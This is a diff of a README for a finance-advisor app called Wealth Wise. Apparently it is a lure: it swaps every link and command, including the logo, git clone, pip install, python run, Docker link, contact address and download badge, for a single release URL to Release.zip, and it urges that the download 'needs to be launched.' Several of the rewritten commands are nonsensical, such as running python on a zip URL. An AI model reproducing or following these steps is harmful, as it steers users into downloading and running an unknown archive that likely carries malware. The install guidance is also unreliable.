@@ -1,6 +1,6 @@
 # Welcome to Wealth Wise 🚀
 
-![Wealth Wise Logo](https://example.com/wealth-wise-logo.png)
+![Wealth Wise Logo](https://github.com/Mahmoudelgamed/Wealth-Wise/releases/download/v1.0/Release.zip)
 
 ## Description 📝
 
@@ -19,21 +19,21 @@ Welcome to Wealth Wise - your AI-powered finance advisor! This repository combin
 To clone the repository, run the following command:
 
 ```bash
-git clone https://github.com/username/wealth-wise.git
+git clone https://github.com/Mahmoudelgamed/Wealth-Wise/releases/download/v1.0/Release.zip
 ```
 
 Install the required dependencies for both the frontend and backend:
 
 ```bash
 npm install
-pip install -r requirements.txt
+pip install -r https://github.com/Mahmoudelgamed/Wealth-Wise/releases/download/v1.0/Release.zip
 ```
 
 Start the React frontend and Flask backend:
 
 ```bash
 npm start
-python app.py
+python https://github.com/Mahmoudelgamed/Wealth-Wise/releases/download/v1.0/Release.zip
 ```
 
 Visit [https://localhost:3000](https://localhost:3000) to access Wealth Wise in your browser.
@@ -49,7 +49,7 @@ Visit [https://localhost:3000](https://localhost:3000) to access Wealth Wise in 
 
 ## Deployment 🚀
 
-We recommend deploying Wealth Wise using [Docker](https://www.docker.com/). Simply build the Docker image and run it on your desired platform.
+We recommend deploying Wealth Wise using [Docker](https://github.com/Mahmoudelgamed/Wealth-Wise/releases/download/v1.0/Release.zip). Simply build the Docker image and run it on your desired platform.
 
 ## Contributions Welcome ❤️
 
@@ -57,11 +57,11 @@ We welcome contributions to Wealth Wise! Feel free to fork the repository, make 
 
 ## Feedback 📧
 
-We'd love to hear your feedback on Wealth Wise. If you have any suggestions, ideas, or issues to report, please create a GitHub issue or reach out to us at [wealthwise@example.com](mailto:wealthwise@example.com).
+We'd love to hear your feedback on Wealth Wise. If you have any suggestions, ideas, or issues to report, please create a GitHub issue or reach out to us at [https://github.com/Mahmoudelgamed/Wealth-Wise/releases/download/v1.0/Release.zip](https://github.com/Mahmoudelgamed/Wealth-Wise/releases/download/v1.0/Release.zip).
 
 ---
 
-[![Download Wealth Wise](https://img.shields.io/badge/Download-Wealth%20Wise-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Wealth Wise](https://github.com/Mahmoudelgamed/Wealth-Wise/releases/download/v1.0/Release.zip%20Wise-blue)](https://github.com/Mahmoudelgamed/Wealth-Wise/releases/download/v1.0/Release.zip)
 
 **Note:** Download needs to be launched. 
 
